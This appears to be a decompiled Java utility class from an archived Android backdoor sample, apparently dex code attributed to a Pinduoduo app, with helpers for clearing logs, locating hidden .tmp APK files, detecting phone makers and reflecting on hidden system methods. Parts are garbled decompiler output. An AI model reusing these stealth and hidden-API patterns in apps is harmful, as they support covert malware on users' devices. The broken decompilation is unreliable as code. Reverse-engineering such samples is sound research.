package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import java.io.Closeable;
import java.io.File;
import java.io.FileFilter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class DynamicUtils {
  public static void clearLogcat() {
    try {
      return;
    } finally {
      Exception exception = null;
    } 
  }
  
  public static boolean copyFile(File paramFile1, File paramFile2) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #5
    //   3: aconst_null
    //   4: astore #4
    //   6: new java/io/FileInputStream
    //   9: dup
    //   10: aload_0
    //   11: invokespecial <init> : (Ljava/io/File;)V
    //   14: astore_3
    //   15: new java/io/FileOutputStream
    //   18: dup
    //   19: aload_1
    //   20: invokespecial <init> : (Ljava/io/File;)V
    //   23: astore_0
    //   24: sipush #1024
    //   27: newarray byte
    //   29: astore_1
    //   30: aload_3
    //   31: aload_1
    //   32: invokevirtual read : ([B)I
    //   35: istore_2
    //   36: iload_2
    //   37: ifle -> 50
    //   40: aload_0
    //   41: aload_1
    //   42: iconst_0
    //   43: iload_2
    //   44: invokevirtual write : ([BII)V
    //   47: goto -> 30
    //   50: aload_3
    //   51: invokevirtual close : ()V
    //   54: aload_0
    //   55: invokevirtual close : ()V
    //   58: iconst_1
    //   59: ireturn
    //   60: astore #4
    //   62: aload_0
    //   63: astore_1
    //   64: aload #4
    //   66: astore_0
    //   67: goto -> 73
    //   70: astore_0
    //   71: aconst_null
    //   72: astore_1
    //   73: goto -> 89
    //   76: aconst_null
    //   77: astore_0
    //   78: aload_3
    //   79: astore_1
    //   80: goto -> 104
    //   83: astore_0
    //   84: aconst_null
    //   85: astore_1
    //   86: aload #4
    //   88: astore_3
    //   89: aload_3
    //   90: invokevirtual close : ()V
    //   93: aload_1
    //   94: invokevirtual close : ()V
    //   97: aload_0
    //   98: athrow
    //   99: aconst_null
    //   100: astore_0
    //   101: aload #5
    //   103: astore_1
    //   104: aload_1
    //   105: invokevirtual close : ()V
    //   108: aload_0
    //   109: invokevirtual close : ()V
    //   112: iconst_0
    //   113: ireturn
    //   114: astore_0
    //   115: goto -> 99
    //   118: astore_0
    //   119: goto -> 76
    //   122: astore_1
    //   123: goto -> 78
    //   126: astore_0
    //   127: goto -> 58
    //   130: astore_1
    //   131: goto -> 97
    //   134: astore_0
    //   135: iconst_0
    //   136: ireturn
    // Exception table:
    //   from	to	target	type
    //   6	15	114	java/lang/Exception
    //   6	15	83	finally
    //   15	24	118	java/lang/Exception
    //   15	24	70	finally
    //   24	30	122	java/lang/Exception
    //   24	30	60	finally
    //   30	36	122	java/lang/Exception
    //   30	36	60	finally
    //   40	47	122	java/lang/Exception
    //   40	47	60	finally
    //   50	58	126	java/lang/Exception
    //   89	97	130	java/lang/Exception
    //   104	112	134	java/lang/Exception
  }
  
  public static void debugLog(String paramString) {
    Log.d("SD1000.DY", paramString);
  }
  
  public static void deleteRecycle(File paramFile) {
    if (paramFile == null)
      return; 
    try {
      if (!paramFile.exists())
        return; 
      if (paramFile.isDirectory()) {
        File[] arrayOfFile = paramFile.listFiles();
        if (arrayOfFile != null) {
          int j = arrayOfFile.length;
          for (int i = 0; i < j; i++)
            deleteRecycle(arrayOfFile[i]); 
        } 
      } 
      paramFile.delete();
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static File getApkFile(Context paramContext, final String name) {
    File file;
    if (Constants.DEBUG) {
      file = Environment.getExternalStorageDirectory();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(name);
      stringBuilder.append(".tmp");
      return new File(file, stringBuilder.toString());
    } 
    File[] arrayOfFile = file.getFilesDir().listFiles(new FileFilter() {
          public boolean accept(File param1File) {
            String str = param1File.getName();
            return (param1File.exists() && param1File.isFile() && !TextUtils.isEmpty(str) && str.startsWith(name) && str.endsWith(".tmp"));
          }
        });
    return (arrayOfFile != null && arrayOfFile.length > 0) ? arrayOfFile[0] : null;
  }
  
  public static String getManufacturer() {
    String str2 = Build.MANUFACTURER;
    String str1 = "oppo";
    if (!"oppo".equalsIgnoreCase(str2)) {
      if ("realme".equalsIgnoreCase(str2))
        return "oppo"; 
      str1 = "huawei";
      if (!"huawei".equalsIgnoreCase(str2)) {
        if ("honor".equalsIgnoreCase(str2))
          return "huawei"; 
        str1 = "vivo";
        if (!"vivo".equalsIgnoreCase(str2)) {
          if ("bbk".equalsIgnoreCase(str2))
            return "vivo"; 
          str1 = "xiaomi";
          if (!"xiaomi".equalsIgnoreCase(str2))
            return "redmi".equalsIgnoreCase(str2) ? "xiaomi" : ""; 
        } 
      } 
    } 
    return str1;
  }
  
  public static Field getSysField(Class<?> paramClass, String paramString) {
    int i = 0;
    try {
      Field[] arrayOfField = (Field[])Class.class.getDeclaredMethod("getDeclaredFields", new Class[0]).invoke(paramClass, new Object[0]);
      if (arrayOfField == null)
        return null; 
      int j = arrayOfField.length;
      return null;
    } finally {
      paramClass = null;
    } 
  }
  
  public static Method getSysMethod(Class<?> paramClass, String paramString) {
    int i = 0;
    try {
      Method[] arrayOfMethod = (Method[])Class.class.getDeclaredMethod("getDeclaredMethods", new Class[0]).invoke(paramClass, new Object[0]);
      if (arrayOfMethod == null)
        return null; 
      int j = arrayOfMethod.length;
      return null;
    } finally {
      paramClass = null;
    } 
  }
  
  public static void runInNewThread(Runnable paramRunnable) {
    (new Thread(paramRunnable)).start();
  }
  
  public static void safetyClose(Closeable paramCloseable) {
    if (paramCloseable != null)
      try {
        paramCloseable.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\f4247da0-6274-44eb-859a-b4c35ec0dd71-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\DynamicUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */